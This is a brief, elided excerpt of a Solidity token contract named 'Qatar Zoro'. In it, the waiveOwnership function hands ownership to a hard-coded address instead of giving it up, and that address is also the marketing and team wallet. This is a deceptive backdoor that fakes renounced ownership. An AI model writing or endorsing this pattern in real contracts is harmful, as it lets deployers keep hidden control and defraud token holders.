...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xb71e0bA48161Dd77406f69db6E43F40e896C1c1A);
    }
...
contract QatarZoro is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Qatar Zoro";
    string private _symbol = "QTRZR";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xb71e0bA48161Dd77406f69db6E43F40e896C1c1A);
    address payable private teamWalletAddress = payable(0xb71e0bA48161Dd77406f69db6E43F40e896C1c1A);
